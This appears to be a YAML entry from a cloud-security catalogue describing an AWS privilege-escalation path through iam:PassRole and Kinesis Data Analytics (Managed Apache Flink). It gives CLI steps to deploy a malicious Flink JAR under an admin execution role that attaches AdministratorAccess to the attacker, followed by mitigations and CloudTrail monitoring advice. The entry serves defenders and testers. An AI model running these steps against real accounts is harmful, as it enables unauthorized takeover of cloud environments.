id: kinesisanalytics-001
name: iam:PassRole + kinesisanalytics:CreateApplication + kinesisanalytics:StartApplication
category: new-passrole
services:
  - iam
  - kinesisanalytics

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must be able to pass the target admin IAM role to the Kinesis Data Analytics service
    - permission: kinesisanalytics:CreateApplication
      resourceConstraints: No resource constraints required
    - permission: kinesisanalytics:StartApplication
      resourceConstraints: No resource constraints required; note that the IAM permission namespace is kinesisanalytics even for v2 (Managed Apache Flink) API calls
  additional:
    - permission: kinesisanalytics:DescribeApplication
      resourceConstraints: Useful for polling application status to confirm execution
    - permission: kinesisanalytics:ListApplications
      resourceConstraints: Helpful for discovering existing applications
    - permission: iam:ListAttachedUserPolicies
      resourceConstraints: Useful for verifying privilege escalation success

description: A principal with `iam:PassRole`, `kinesisanalytics:CreateApplication`, and `kinesisanalytics:StartApplication` can escalate privileges by creating a Managed Apache Flink application (Amazon Kinesis Data Analytics v2) with an admin service execution role. Once the application starts, the Flink job code runs using the execution role's credentials and calls `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user. Note that while the SDK uses the `kinesisanalyticsv2` namespace, the IAM permission uses the `kinesisanalytics` namespace for both v1 and v2 APIs.

prerequisites:
  admin:
    - A role must exist that trusts kinesisanalytics.amazonaws.com to assume it
    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
    - An S3 bucket must be accessible containing the malicious Flink application JAR
  lateral:
    - A role must exist that trusts kinesisanalytics.amazonaws.com and has elevated permissions
    - An S3 bucket must be accessible containing the Flink application JAR

exploitationSteps:
  awscli:
    - step: 1
      command: |
        # Build a Flink JAR that calls iam:AttachUserPolicy using the execution role credentials.
        # The JAR entry point should use the AWS SDK for Java or Python (via PyFlink) to:
        #   iam_client.attach_user_policy(
        #     UserName="STARTING_USER",
        #     PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        #   )

        aws s3 cp malicious-flink-app.jar s3://CODE_BUCKET/exploit/malicious-flink-app.jar
      description: Build a Flink application JAR containing code that uses the execution role's credentials (injected automatically by the Flink AWS credential provider) to call iam:AttachUserPolicy. Upload it to S3.
    - step: 2
      command: |
        aws kinesisanalyticsv2 create-application \
          --application-name privesc-flink-app \
          --runtime-environment FLINK-1_19 \
          --service-execution-role arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
          --application-configuration '{
            "ApplicationCodeConfiguration": {
              "CodeContent": {
                "S3ContentLocation": {
                  "BucketARN": "arn:aws:s3:::CODE_BUCKET",
                  "FileKey": "exploit/malicious-flink-app.jar"
                }
              },
              "CodeContentType": "ZIPFILE"
            },
            "FlinkApplicationConfiguration": {
              "ParallelismConfiguration": {
                "ConfigurationType": "CUSTOM",
                "Parallelism": 1,
                "ParallelismPerKPU": 1,
                "AutoScalingEnabled": false
              }
            }
          }'
      description: Create the Flink application, passing the admin role as the serviceExecutionRole via iam:PassRole. Note that the SDK API is kinesisanalyticsv2 but the IAM permission is kinesisanalytics:CreateApplication.
    - step: 3
      command: |
        aws kinesisanalyticsv2 start-application \
          --application-name privesc-flink-app \
          --run-configuration '{}'
      description: Start the Flink application. Once it transitions to RUNNING, the malicious Flink job executes with the admin execution role's credentials and attaches AdministratorAccess to the starting user.
    - step: 4
      command: |
        aws kinesisanalyticsv2 describe-application \
          --application-name privesc-flink-app \
          --query 'ApplicationDetail.ApplicationStatus' \
          --output text
      description: Poll application status. Once RUNNING, check for IAM policy attachment to confirm escalation succeeded.

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative Kinesis Data Analytics execution roles** - Very rarely does a Flink application need administrative IAM access. Use the principle of least privilege and scope execution roles to only the Kinesis streams, S3 buckets, and services the application legitimately requires.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificFlinkRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "kinesisanalytics.amazonaws.com"
      }
    }
  }
  ```

  - **Note on IAM permission namespace**: The IAM permission for Managed Apache Flink (v2 API) uses the `kinesisanalytics` prefix, not `kinesisanalyticsv2`. Policy restrictions must use `kinesisanalytics:CreateApplication` and `kinesisanalytics:StartApplication`.
  - Monitor CloudTrail for unusual Kinesis Data Analytics application creation followed by immediate starts
  - Monitor CloudTrail for applications created by principals who do not usually create analytics applications
  - Monitor CloudTrail for roles being passed to the kinesisanalytics service that haven't been used before
  - Alert on IAM policy attachment events originating from Kinesis Data Analytics execution roles
  - Regularly audit all IAM roles that trust kinesisanalytics.amazonaws.com and down-scope any with administrative access

limitations: |
  This path provides administrative access only if the passed execution role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks. The Flink application typically takes 2-5 minutes to reach RUNNING state.

